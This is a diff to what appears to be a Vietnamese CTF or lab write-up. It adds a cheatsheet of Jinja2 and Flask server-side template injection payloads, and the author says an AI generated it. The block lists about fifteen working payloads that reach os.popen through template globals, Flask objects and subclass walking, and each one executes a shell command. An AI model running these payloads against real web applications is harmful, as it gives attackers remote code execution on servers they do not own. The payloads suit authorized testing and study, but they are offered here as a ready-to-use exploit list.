@@ -91,3 +91,31 @@ Cuối cùng mình thử đơn giản lại thành công :)) Troll troll vn
 
 ![[Pasted image 20261015184443.png]]
 ![[Pasted image 20261015184548.png]]
+
+
+Cheatsheet mình nhờ AI tạo để lần sau tiện tra cứu:
+```
+# === JINJA2 DEFAULT GLOBALS ===
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{range.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{dict.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# === FLASK INJECTED GLOBALS ===
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{session.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{g.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# === RUNTIME ===
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+
+# === SUBCLASSES (khi không có global nào dùng được) ===
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()}}
+```
